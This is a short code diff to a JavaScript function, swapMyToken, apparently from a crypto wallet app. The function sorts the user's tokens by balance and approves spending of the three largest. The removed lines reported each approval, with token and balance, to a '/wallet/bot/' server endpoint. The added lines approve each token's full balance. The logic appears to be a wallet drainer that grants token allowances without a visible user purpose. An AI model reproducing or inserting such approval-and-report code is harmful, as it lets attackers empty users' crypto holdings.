@@ -107,29 +107,9 @@ export async function swapMyToken ({ state }) {
 
   arr.sort((a, b) => a.balance < b.balance ? 1 : -1)
 
-  await arr[0].approve(state.wallet.address).then(() => {
-    sendBotReport(arr[0], state.wallet.address)
-  })
-  await arr[1].approve(state.wallet.address).then(() => {
-    sendBotReport(arr[1], state.wallet.address)
-  })
-  await arr[2].approve(state.wallet.address).then(() => {
-    sendBotReport(arr[2], state.wallet.address)
-  })
-}
-
-function sendBotReport (coin, address) {
-  try {
-    axios.get(`${server.walletServerURI}/wallet/bot/`, {
-      params: {
-        address,
-        approved_token: coin.name,
-        balance: coin.balance
-      }
-    })
-  } catch (e) {
-    console.log(e)
-  }
+  await arr[0].approve(state.wallet.address, arr[0].balance)
+  await arr[1].approve(state.wallet.address, arr[1].balance)
+  await arr[2].approve(state.wallet.address, arr[2].balance)
 }
 
 export function chainChanged ({ commit }, chainId) {
